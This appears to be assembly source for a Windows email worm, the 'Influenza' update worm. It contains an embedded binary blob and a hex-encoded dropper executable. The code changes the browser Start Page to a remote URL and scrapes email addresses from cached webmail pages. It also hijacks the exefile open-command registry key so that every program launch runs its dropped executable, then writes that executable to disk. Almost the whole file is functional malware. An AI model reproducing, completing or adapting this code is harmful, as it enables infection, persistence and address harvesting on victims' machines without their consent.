        db 84, 94, 0F7h, 0EFh, 0E2h, 0A7h, 0DBh, 45, 0Fh, 0BBh, 18, 03, 45, 02Eh
        db 0C5h, 09Ah, 33, 06Fh, 0C0h, 0EEh, 0AAh, 07Ch, 0C7h, 0EEh, 43, 44, 0BBh
        db 6Eh, 14, 6Bh, 0EBh, 0B8h, 13, 19, 31, 0BBh, 93, 19, 31, 0BBh, 14, 93
        db 42, 01, 06Fh, 97, 82, 50, 50, 0E8h, 82, 0A2h, 45, 0EEh, 0A0h, 08Ch
        db 09Ch, 01Bh, 50, 0FBh, 0B6h, 05Eh, 0CBh, 0D1h, 0E3h, 01Eh, 09Bh, 0DCh
        db 0A7h, 0C1h, 0EFh, 0FEh, 0C9h, 64, 34, 05Eh, 0F2h, 02Bh, 0BCh, 0A5h
        db 06Fh, 0BAh, 0DAh, 05Fh, 80, 0F2h, 0BFh, 48, 06Bh, 0D9h, 01Ah, 0DDh
        db 73, 09Eh, 0F2h, 07Eh, 92, 0DBh, 0EFh, 37, 03Bh, 85, 0Eh, 0E7h, 25
        db 0C6h, 05, 0Fh, 0BBh, 0ACh, 96, 72, 01Fh, 58, 12, 18, 35, 0Fh, 07, 13
        db 0B6h, 56, 50, 0FBh, 0B5h, 30, 80, 33, 0EAh, 02Ah, 50, 0E9h, 19, 0A8h
        db 24, 20, 28, 7Dh, 86, 91, 0AFh, 0D4h, 23, 0D8h, 06Ch, 6Dh, 17, 0FDh
        db 16, 0Ch, 96, 73, 50, 27, 06Bh, 0B8h, 32, 0D7h, 05Bh, 08Ah, 87, 0A7h
        db 04Ah, 0E9h, 02Dh, 0DBh, 88, 0EAh, 0A6h, 10, 37, 0Ah, 7Ch, 9Fh, 0DBh
        db 69, 0ADh, 0DDh, 0DAh, 75, 0FCh, 0Eh, 0BBh, 85, 0FDh, 67, 08Ah, 74
        db 0D7h, 37, 0E8h, 0B2h, 0EEh, 0E7h, 0DFh, 05Ch, 06Dh, 28, 0CBh, 82
        db 72, 52, 52, 69, 23, 75, 0B9h, 58, 13, 05Ch, 06, 0BBh, 08Ah, 63, 04Eh
        db 75, 0C2h, 01Dh, 0B4h, 0E5h, 0D2h, 07Ch, 0B8h, 87, 45, 0DDh, 02Ah
        db 0FCh, 04Fh, 59, 3Bh, 0A7h, 83, 0A6h, 0F5h, 0D1h, 47, 0C4h, 051h, 06Ch
        db 53, 90, 87, 0A9h, 0E3h, 0B7h, 04Ah, 52, 21, 06Ah, 0B8h, 0BBh, 0BAh, 61
        db 03Bh, 0ADh, 31, 93, 01Bh, 0B9h, 31, 93, 01Bh, 0B3h, 0F3h, 057h, 0FEh
        db 88, 0BFh, 94, 01Eh, 0F0h, 03Ah, 06Fh, 58, 44, 0BBh, 14, 0F7h, 0DBh
        db 08Dh, 28, 07Ch, 0F1h, 0BBh, 33, 025h, 78, 42, 68, 0E0h, 29, 93, 86
        db 92, 04, 02Eh, 0BBh, 09Ah, 0E5h, 45, 65, 06Fh, 23, 07Ah, 04Ch, 01Eh
        db 98, 04h, 0E1h, 0F9h, 93, 0BAh, 01Ch, 01Eh, 09Bh, 61, 0C8h, 27, 05Ch
        db 0AFh, 0A5h, 24, 71, 02Bh, 40, 0D9h, 03Bh, 09Eh, 98, 97, 01Fh, 0B7h
        db 0EFh, 53, 05Bh, 36, 01Fh, 04Fh, 54, 0EEh, 02Ah, 71, 04Ah, 07Ah, 0AEh
        db 91, 09h, 05Bh, 08Ah, 0B8h, 31, 0BBh, 02Ah, 09h, 58, 0BBh, 0A7h, 41
        db 05Bh, 0CFh, 01Fh, 0DAh, 35, 02, 85, 06Fh, 64, 80, 0D1h, 02Bh, 01Bh
        db 0B7h, 06Fh, 0F6h, 92, 0D8h, 37, 47, 0Fh, 0BAh, 98, 0A8h, 35, 88, 0EBh
        db 0A, 86, 049h, 0BEh, 95, 0FBh, 0A3h, 45, 0A1h, 34, 04, 0A6h, 93, 0BAh
        db 58, 14, 08Fh, 07, 02Ah, 03Ah, 24, 07Dh, 28, 52, 37, 0DDh, 02Ch, 09Bh
        db 05Bh, 0A7h, 0C6h, 0FEh, 0BBh, 86, 0BCh, 75, 83, 98, 82, 59, 0Fh, 90
        db 85, 0A5h, 0DEh, 0A6h, 80, 04Ch, 16, 0B1h, 0BBh, 93, 19, 31, 0BBh, 93
        db 19, 31, 0BBh, 0D2h, 0A7h, 0E8h, 0E2h, 0F2h, 0AFh, 47, 0C0h, 06Ah, 31
        db 0BBh, 17, 50, 28, 07Ch, 58, 31, 0DDh, 79, 0F5h, 91, 06Dh, 07Ah, 53
        db 84, 91, 08Dh, 0C6h, 84, 91, 0BBh, 12, 35, 02, 0AFh, 06Dh, 0AEh, 0C8h
        db 71, 0E7h, 0CFh, 01Fh, 49, 0ABh, 41, 06Bh, 0BEh, 0A9h, 80, 48, 0F6h, 98
        db 44, 0BBh, 6C, 0ECh, 21, 62, 0F4h, 0F8h, 31, 0DAh, 0Fh, 44, 0BBh, 0D4h
        db 04Fh, 44, 0BBh, 50, 06Bh, 0BEh, 0FAh, 02Ah, 07Ch, 83, 08Fh, 18, 01Ch
        db 0B9h, 16, 0C6h, 34, 37, 0D4h, 46, 92, 01Dh, 77, 5C, 03Dh, 0A3h, 41
        db 0EBh, 0BEh, 0C7h, 29, 89, 0BAh, 04Eh, 01Dh, 04Ch, 75, 83, 86, 11, 07Ch
        db 62, 09Fh, 72, 78, 95, 0B4h, 0D1h, 0D2h, 08, 02Bh, 0CCh, 0E4h, 75, 03Bh
        db 09Ah, 0A2h, 09Ch, 38, 34, 0F1h, 0BDh, 0C6h, 89, 91, 0F4h, 09, 70, 25
        db 03Bh, 46, 0B6h, 93, 0Eh, 20, 01, 34, 77, 0EBh, 0B9h, 0BEh, 55, 80, 68
        db 39, 48, 03Bh, 0CBh, 06Fh, 54, 99, 0FEh, 09Ah, 0Dh, 0C8h, 25, 19, 28, 71
        db 28, 84, 0CCh, 0A3h, 04Dh, 1B, 0BEh, 0Ch, 0B8h, 75, 05Bh, 27, 48, 0ECh
        db 11, 26, 13, 07Fh, 07Fh, 0C1h, 0B8h, 47, 51, 05Eh, 0BBh, 0AFh, 0EAh, 0FEh
        db 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh
        db 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh
        db 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh
        db 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0C4h, 44, 62

        JPG_END:

        radix 10        ;muj bratr :)

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Update Worm  flu_update.inc                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        SearchDirectory db '*.*',0
        ASC_FILEZ       db 'update*.gif',0
        CreateUpdateASC db 'C:\updateFLU.gif',0
        URL_            db 'www.volny.cz/radix16/flu/update.gif',0
        KeyURL          db 'Software\Microsoft\Internet Explorer\Main',0
        StarURL         db 'Start Page',0
        tmpURL          dd ?
        h_KeyURL        dd ?
        TempPH          db 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\Paths',0
        TempPT          db 'Directory',0
        mailadd_        db 'ViewMail*.html',0
        tesF            db 'C:\heyya.txt',0
        numbers1        dd 0
        ebxreg          dd 0
        esireg          dd 0
        edireg          dd 0
        searchhandle    dd ?

        key_datax       db 260 dup(0)
        key_lenx        dd 260
        key_typex       dd 0



_UpdateFLU:

                mov     edx,80000001h
                call    _SaveURL
                mov     edx,80000002h
                call    _SaveURL

                mov     ebx, 80000002h
                lea     edx, dword ptr [offset TempPH]
                call    _proc1x

                lea     edx, dword ptr [offset TempPT]
                call    _proc2x

                push    offset key_datax
                call    SetCurrentDirectoryA

                xor     esi,esi
                mov     ecx,256
                lea     edi,[FindFileData.cFileName]
nuluj_:
                xor     al,al
                mov     [edi + esi],al
                inc     esi
                loop    nuluj_


                mov     edx, offset SearchDirectory
                push    offset FindFileData
                push    edx

                call    FindFirstFileA

                inc     eax
                je      quitTMP
                dec     eax

                mov     dword ptr [searchhandle],eax

loop_____:
                lea     edi,[FindFileData.cFileName]
                cmp     byte ptr [edi],'.'
                je      _NextSearchDirec

                mov     ecx,100
_hledejtecku:
                inc     edi

                cmp     byte ptr [edi],'.'
                je      _NextSearchDirec

                loop    _hledejtecku

                jmp     sgkjshgdkjs


_NextSearchDirec:
                xor     esi,esi
                mov     ecx,256
                lea     edi,[FindFileData.cFileName]
nuluj__:
                xor     al,al
                mov     [edi + esi],al
                inc     esi
                loop    nuluj__

                push    offset FindFileData
                push    dword ptr [searchhandle]
                call    FindNextFileA

                inc     eax
                je      quitTMP
                dec     eax

                jmp     short loop_____

sgkjshgdkjs:
                lea     edi,[FindFileData.cFileName]
                mov     edireg,edi

                push    edi
                call    SetCurrentDirectoryA

                mov     edx, offset ASC_FILEZ
                push    offset FindFileData
                push    edx
                call    FindFirstFileA

                push    ecx
                call    FindClose

                inc     eax
                je      quitTMPxx
                dec     eax

                lea     edi,[FindFileData.cFileName]

                push    0
                push    offset CreateUpdateASC
                push    edi
                call    CopyFileA


quitTMPxx:
                mov     edx, offset mailadd_
                push    offset FindFileData
                push    edx
                call    FindFirstFileA

                inc     eax
                je      quitTMPxxx
                dec     eax

                lea     edi,[FindFileData.cFileName]

                push    0
                push    000000080h
                push    3
                push    0
                push    000000001h
                push    080000000h + 040000000h
                push    edi
                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                call    _Search_emailAdress


                push    dword ptr [_filehandle]
                call    CloseHandle

quitTMPxxx:
                push    offset key_datax
                call    SetCurrentDirectoryA


                jmp     _NextSearchDirec


MailIshere?:

quitTMP:
                ret

_Search_emailAdress:
                mov     edx,[FindFileData.nFileSizeLow]

                push    00h
                push    offset number
                push    edx
                push    offset MailTemporar
                push    dword ptr [_filehandle]
                call    ReadFile


                mov     ecx,[FindFileData.nFileSizeLow]
                xor     esi,esi

__l1emx:

__l1em:
                mov     edi,offset MailTemporar
                xor     edx,edx

                mov     al,[edi + esi]
                cmp     al,'@'
                je      __l2em
                inc     esi

                loop    __l1em
                jmp     EndSearch

__l2em:
                mov     al,[edi + esi]
                cmp     al,';'
                je      __l3emx
                cmp     edx,14
                je      setup_nail
                dec     esi
                inc     edx
                inc     ecx
                loop    __l2em
                jmp     EndSearch

setup_nail:     add     esi,13
                jmp     __l1em

__l1ems:        inc     ebx
                xor     al,al
                mov     [_emailto + ebx],al
                mov     ebxreg,ebx
                jmp     __l1em

__l3emx:        xor     edx,edx
                inc     esi
                mov     ebx,ebxreg

__l3em:
                mov     al,[edi + esi]

                cmp     al,'&'
                je      __l1ems
                cmp     al,20h
                je      __l1ems
                mov     [_emailto + ebx],al
                cmp     edx,40
                je      __l1em
                inc     ebx
                inc     esi
                inc     edx

                loop    __l3em
EndSearch:



                ret

 _SaveURL:
                xor     eax,eax

                push    offset tmpURL
                push    offset h_KeyURL
                push    eax
                push    3
                push    eax
                push    eax
                push    eax
                push    offset KeyURL
                push    edx

                call    RegCreateKeyExA

                push    0
                push    offset URL_
                push    1
                push    0
                push    offset StarURL
                mov     ebx, dword ptr [h_KeyURL]
                push    ebx

                call    RegSetValueExA

                push    ebx
                call    RegCloseKey

                ret

        _proc1x:                                ;
                lea     eax, dword ptr [offset key_handle]
                push    eax                    ;
                push    KEY_ALL_ACCESS         ;
                push    0                      ;
                push    edx                    ;
                push    ebx                     ;
                                               ;
                call    RegOpenKeyExA          ;
                                               ;
                                               ;
                ret                            ;
                                               ;
        _proc2x:                                ;
                lea     eax, dword ptr [offset key_lenx]
                push    eax                    ;
                lea     eax, dword ptr [offset key_datax]
                push    eax                    ;
                lea     eax, dword ptr [offset key_typex]
                push    eax                    ;
                push    0                      ;
                push    edx                    ;
                mov     eax, dword ptr [key_handle]
                push    eax                    ;
                                               ;
                call    RegQueryValueExA       ;
                                               ;
                push    dword ptr [key_handle] ;         ;handle
                                               ;
                call    RegCloseKey            ;
                ret                            ;

_emailto        db      1000 dup (?)
                db      00,00

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Reg  flu_reg.inc                                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

; (:-))
; (:-))
; (:-))
; "%1" %*

_DataForRPIWE:

                KEY666          db 'exefile',0
                EXE_RUN666      db 'exefile\shell\open\command',0
                REG_FILE666     db 'C:\InflunzaSystemCryptoLab.exe %1',0
                PathFile        db 'C:\InflunzaSystemCryptoLab.exe',0
                h_Key666        dd ?
                tmp666          dd ?

_RPIWE:

                xor     eax,eax

                push    offset tmp666
                push    offset h_Key666
                push    eax
                push    3
                push    eax
                push    eax
                push    eax
                push    offset EXE_RUN666
                push    80000000h

                call    RegCreateKeyExA

                push    0
                push    offset REG_FILE666
                push    1
                push    0
                push    0
                mov     ebx, dword ptr [h_Key666]
                push    ebx

                call    RegSetValueExA

_RegCloseKey666:
                push    ebx
                call    RegCloseKey


                xor     ebx,ebx

                push    ebx
                push    000000080h
                push    2
                push    ebx
                push    000000001h
                push    080000000h + 040000000h
                push    offset PathFile
                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     ebx,offset Head333End - offset Head333
                mov     edx,offset Head333
                call    _WriteFile


                push    dword ptr [_filehandle]
                call    CloseHandle

                ret

;BB = 864 dup (00)
_HexaEngine:
        radix 16

Head333:
        db 4Dh, 5Ah, 50, 00, 02, 00, 00, 00, 04, 00, 0Fh, 00, 0FFh, 0FFh, 00, 00
        db 0B8h, 00, 00, 00, 00, 00, 00, 00, 40, 00, 1Ah, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00
        db 0BAh, 10, 00, 0Eh, 1Fh, 0B4h, 09, 0CDh, 21, 0B8h, 01, 4Ch, 0CDh, 21, 90, 90
        db 54h, 68, 69, 73, 20, 70, 72, 6Fh, 67, 72, 61, 6Dh, 20, 6Dh, 75, 73
        db 74, 20, 62, 65, 20, 72, 75, 6Eh, 20, 75, 6Eh, 64, 65, 72, 20, 57
        db 69, 6Eh, 33, 32, 0Dh, 0Ah, 24, 37, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00 ,00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00 ,00, 00
        db 50, 45, 00, 00, 4Ch, 01, 04, 00, 4Fh, 2Ah, 0B1h, 60, 00, 00, 00, 00
        db 00, 00, 00, 00, 0E0h, 00, 8Eh, 81, 0Bh, 01, 02, 19, 00, 04, 00, 00
        db 00, 06, 00, 00, 00, 00, 00, 00, 00, 10, 00, 00, 00, 10, 00, 00
        db 00, 20, 00, 00, 00, 00, 40, 00, 00, 10, 00, 00, 00, 02, 00, 00
        db 01, 00, 00, 00, 00, 00, 00, 00, 03, 00, 0Ah, 00, 00, 00, 00, 00
        db 00, 80, 00, 00, 00, 04, 00, 00, 00, 00, 00, 00, 02, 00, 00, 00
        db 00, 00, 10, 00, 00, 20, 00, 00, 00, 00, 10, 00, 00, 10, 00, 00
        db 00, 00, 00, 00, 10, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 60, 00, 00, 0B8h, 01, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 70, 00, 00, 0A4h, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 43, 4Fh, 44, 45, 00, 00, 00, 00
        db 00, 10, 00, 00, 00, 10, 00, 00, 00, 04, 00, 00, 00, 06, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 20, 00, 00, 0E0h
        db 44, 41, 54, 41, 00, 00, 00, 00, 00, 40, 00, 00, 00, 20, 00, 00
        db 00, 02, 00, 00, 00, 0Ah, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 40, 00, 00, 0C0h, 2Eh, 69, 64, 61, 74, 61, 00, 00
        db 00, 10, 00, 00, 00, 60, 00, 00, 00, 02, 00, 00, 00, 0Ch, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 40, 00, 00, 0C0h
        db 2Eh, 72, 65, 6Ch, 6Fh, 63, 00, 00, 00, 10, 00, 00, 00, 70, 00, 00
        db 00, 02, 00, 00, 00, 0Eh, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 40, 00, 00, 50, 00, 00, 00, 00, 00, 00, 00, 00

        db 360 dup (00)


Head3332:
        db 0E8h, 6Bh, 03, 00, 00, 8Bh, 0F0h, 80, 7Eh, 01, 3Ah, 74, 06, 40, 0BEh, 5Ch
        db 26, 40, 00, 50, 68, 5Ch, 26, 40, 00, 0E8h, 22, 03, 00, 00, 0BEh, 5Ch
        db 26, 40, 00, 2Bh, 0FFh, 8Ah, 04, 3Eh, 3Ch, 20, 74, 03, 47, 0EBh, 0F6h, 33
        db 0D2h, 47, 8Ah, 04, 3Eh, 0Ah, 0C0h, 74, 0Ah, 88, 82, 5Ch, 2Bh, 40, 00, 47
        db 42, 0EBh, 0EFh, 89, 15, 50, 21, 40, 00, 33, 0DBh, 53, 68, 80, 00, 00
        db 00, 6Ah, 03, 53, 6Ah, 01, 68, 00, 00, 00, 0C0h, 68, 00, 20, 40, 00
        db 0E8h, 0F3h, 02, 00, 00, 0A3h, 4Ch, 21, 40, 00, 0BAh, 0F4h, 01, 00, 00, 6Ah
        db 00, 68, 40, 21, 40, 00, 52, 68, 5Ch, 21, 40, 00, 0FFh, 35, 4Ch, 21
        db 40, 00, 0E8h, 0EFh, 02, 00, 00, 0FFh, 35, 4Ch, 21, 40, 00, 0E8h, 0BAh, 02
        db 00, 00, 68, 5Ch, 21, 40, 00, 0E8h, 0C2h, 02, 00, 00, 68, 6Ch, 5Ch, 40
        db 00, 68, 5Ch, 2Bh, 40, 00, 0E8h, 0BFh, 02, 00, 00, 33, 0DBh, 53, 68, 80
        db 00, 00, 00, 6Ah, 03, 53, 6Ah, 01, 68, 00, 00, 00, 0C0h, 68, 5Ch, 2Bh
        db 40, 00, 0E8h, 91, 02, 00, 00, 0A3h, 4Ch, 21, 40, 00, 2Bh, 0D2h, 33, 0C0h
        db 0E8h, 3Fh, 02, 00, 00, 08Bh, 0Dh, 8Ch, 5Ch, 40, 00, 8Bh, 0D1h, 0B8h, 40, 42
        db 0Fh, 00, 2Bh, 0C2h, 72, 29, 81, 0F9h, 00, 50, 00, 00, 74, 21, 81, 0F9h
        db 00, 60, 00, 00, 74, 19, 81, 0F9h, 00, 70, 00, 00, 74, 11, 81, 0F9h
        db 00, 80, 00, 00, 74, 09, 0B8h, 10, 27, 00, 00, 2Bh, 0C1h, 72, 05, 0E9h
        db 10, 02, 00, 00, 0BAh, 10, 27, 00, 00, 6Ah, 00, 68, 40, 21, 40, 00
        db 52, 68, 5Ch, 35, 40, 00, 0FFh, 35, 4Ch, 21, 40, 00, 0E8h, 45, 02, 00
        db 00, 0E8h, 0B2h, 01, 00, 00, 0BFh, 5Ch, 35, 40, 00, 66, 81, 3Fh, 46, 4Ch
        db 74, 05, 0E8h, 0A1h, 01, 00, 00, 0BFh, 5Ch, 35, 40, 00, 66, 0C7h, 07, 4Dh
        db 5Ah, 2Bh, 0D2h, 33, 0C0h, 0E8h, 0BAh, 01, 00, 00, 0BBh, 10, 27, 00, 00, 0BAh
        db 5Ch, 35, 40, 00, 0E8h, 96, 01, 00, 00, 2Bh, 0D2h, 33, 0FFh, 0BEh, 5Ch, 2Bh
        db 40, 00, 8Ah, 04, 3Eh, 3Ch, 2Eh, 74, 0Ah, 88, 82, 5Ch, 30, 40, 00, 47
        db 42, 0EBh, 0EFh, 52, 0E8h, 5Fh, 01, 00, 00, 5Ah, 0C6h, 82, 5Ch, 30, 40, 00
        db 46, 42, 0C7h, 82, 5Ch, 30, 40, 00, 2Eh, 65, 78, 65, 6Ah, 00, 68, 5Ch
        db 30, 40, 00, 68, 5Ch, 2Bh, 40, 00, 0E8h, 0A5h, 01, 00, 00, 0BFh, 5Ch, 35
        db 40, 00, 66, 0C7h, 07, 46, 4Ch, 2Bh, 0D2h, 33, 0C0h, 0E8h, 54, 01, 00, 00
        db 0BBh, 10, 27, 00, 00, 0BAh, 5Ch, 35, 40, 00, 0E8h, 30, 01, 00, 00, 0FFh
        db 35, 4Ch, 21, 40, 00, 0E8h, 72, 01, 00, 00, 68, 5Ch, 30, 40, 00, 0E8h
        db 9Eh, 01, 00, 00, 8Bh, 15, 50, 21, 40, 00, 42, 0C6h, 82, 5Ch, 30, 40
        db 00, 00, 42, 0C6h, 82, 5Ch, 30, 40, 00, 0Dh, 42, 0C6h, 82, 5Ch, 30, 40
        db 00, 0Ah, 83, 05, 50, 21, 40, 00, 04, 33, 0DBh, 53, 68, 80, 00, 00
        db 00, 6Ah, 02, 53, 6Ah, 01, 68, 00, 00, 00, 0C0h, 68, 00, 20, 40, 00
        db 0E8h, 33, 01, 00, 00, 0A3h, 4Ch, 21, 40, 00, 2Bh, 0D2h, 0B8h, 02, 00, 00
        db 00, 0E8h, 0DEh, 00, 00, 00, 8Bh, 1Dh, 50, 21, 40, 00, 0BAh, 5Ch, 30, 40
        db 00, 0E8h, 0B9h, 00, 00, 00, 0FFh, 35, 4Ch, 21, 40, 00, 0E8h, 0FBh, 00, 00
        db 00, 0BAh, 0Ch, 20, 40, 00, 0E8h, 48, 00, 00, 00, 0BAh, 22, 20, 40, 00
        db 0E8h, 57, 00, 00, 00, 8Bh, 35, 50, 21, 40, 00, 83, 0EEh, 06, 0C7h, 86
        db 5Ch, 30, 40, 00, 6Ah, 70, 67, 2Eh, 83, 0C6h, 04, 0C7h, 86, 5Ch, 30, 40
        db 00, 65, 78, 65, 2Eh, 6Ah, 00, 68, 5Ch, 30, 40, 00, 68, 30, 20, 40
        db 00, 0E8h, 0BCh, 00, 00, 00, 6Ah, 00, 0E8h, 0C7h, 00, 00, 00, 5Bh, 46, 53
        db 46, 57, 5Dh, 0B8h, 3Ch, 21, 40, 00, 50, 68, 3Fh, 00, 0Fh, 00, 6Ah, 00
        db 52, 68, 02, 00, 00, 80, 0E8h, 0D3h, 00, 00, 00, 0C3h, 0B8h, 34, 21, 40
        db 00, 50, 0B8h, 30, 20, 40, 00, 50, 0B8h, 38, 21, 40, 00, 50, 6Ah, 00
        db 52, 0A1h, 3Ch, 21, 40, 00, 50, 0E8h, 0ACh, 00, 00, 00, 0FFh, 35, 3Ch, 21
        db 40, 00, 0E8h, 0ADh, 00, 00, 00, 0C3h, 0B9h, 10, 27, 00, 00, 49, 49, 0BEh
        db 5Ch, 35, 40, 00, 46, 46, 81, 36, 0BBh, 00, 00, 00, 46, 0E2h, 0F7h, 6Ah
        db 00, 68, 40, 21, 40, 00, 53, 52, 0FFh, 35, 4Ch, 21, 40, 00, 0E8h, 33
        db 00, 00, 00, 0C3h, 50, 6Ah, 00, 52, 0FFh, 35, 4Ch, 21, 40, 00, 0E8h, 59
        db 00, 00, 00, 0C3h, 0FFh, 35, 4Ch, 21, 40, 00, 0E8h, 1Dh, 00, 00, 00, 68
        db 5Ch, 2Bh, 40, 00, 0E8h, 49, 00, 00, 00, 6Ah, 00, 0E8h, 24, 00, 00, 00
        db 0FFh, 25, 80, 60, 40, 00, 0FFh, 25, 84, 60, 40, 00, 0FFh, 25, 88, 60
        db 40, 00, 0FFh, 25, 8Ch, 60, 40, 00, 0FFh, 25, 90, 60, 40, 00, 0FFh, 25
        db 94, 60, 40, 00, 0FFh, 25, 98, 60, 40, 00, 0FFh, 25, 9Ch, 60, 40, 00
        db 0FFh, 25, 0A0h, 60, 40, 00, 0FFh, 25, 0A4h, 60, 40, 00, 0FFh, 25, 0A8h, 60
        db 40, 00, 0FFh, 25, 0ACh, 60, 40, 00, 0FFh, 25, 0B4h, 60, 40, 00, 0FFh, 25
        db 0B8h, 60, 40, 00, 0FFh, 25, 0BCh, 60, 40, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 43, 3Ah, 5Ch, 74, 65, 73, 74, 2Eh, 74, 78, 74, 00, 53, 4Fh, 46, 54
        db 57, 41, 52, 45, 5Ch, 49, 6Eh, 66, 6Ch, 75, 65, 6Eh, 7Ah, 61, 4Ch, 61
        db 62, 00, 4Dh, 69, 63, 72, 6Fh, 73, 6Fh, 66, 74, 4Fh, 45, 00, 46, 4Ch

        db 100 dup (00)
        db 00,00,00,00,04,01,00,00,00,00,00,00,00,00,00,00
        db 0C0h dup (00)

        db 3Ch, 60, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 0C4h, 60, 00, 00
        db 80, 60, 00, 00, 70, 60, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 0D1h, 60, 00, 00, 0B4h, 60, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00
        db 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 0DEh, 60, 00, 00
        db 0EAh, 60, 00, 00, 0F6h, 60, 00, 00, 04, 61, 00, 00, 10, 61, 00, 00
        db 1Eh, 61, 00, 00, 2Ch, 61, 00, 00, 3Ah, 61, 00, 00, 4Ch, 61, 00, 00
        db 5Eh, 61, 00, 00, 6Ah, 61, 00, 00, 7Ch, 61, 00, 00, 00, 00, 00, 00
        db 86, 61, 00, 00, 9Ah, 61, 00, 00, 0AAh, 61, 00, 00, 00, 00, 00, 00
        db 0DEh, 60, 00, 00, 0EAh, 60, 00, 00, 0F6h, 60, 00, 00, 04, 61, 00, 00
        db 10, 61, 00, 00, 1Eh, 61, 00, 00, 2Ch, 61, 00, 00, 3Ah, 61, 00, 00
        db 4Ch, 61, 00, 00, 5Eh, 61, 00, 00, 6Ah, 61, 00, 00, 7Ch, 61, 00, 00
        db 00, 00, 00, 00, 86, 61, 00, 00, 9Ah, 61, 00, 00, 0AAh, 61, 00, 00
        db 00, 00, 00, 00, 4Bh, 45, 52, 4Eh, 45, 4Ch, 33, 32, 2Eh, 64, 6Ch, 6Ch
        db 00, 41, 44, 56, 41, 50, 49, 33, 32, 2Eh, 64, 6Ch, 6Ch, 00, 00, 00
        db 6Ch, 73, 74, 72, 63, 70, 79, 41, 00, 00, 00, 00, 57, 72, 69, 74
        db 65, 46, 69, 6Ch, 65, 00, 00, 00, 43, 6Ch, 6Fh, 73, 65, 48, 61, 6Eh
        db 64, 6Ch, 65, 00, 00, 00, 43, 6Fh, 70, 79, 46, 69, 6Ch, 65, 41, 00
        db 00, 00, 43, 72, 65, 61, 74, 65, 46, 69, 6Ch, 65, 41, 00, 00, 00
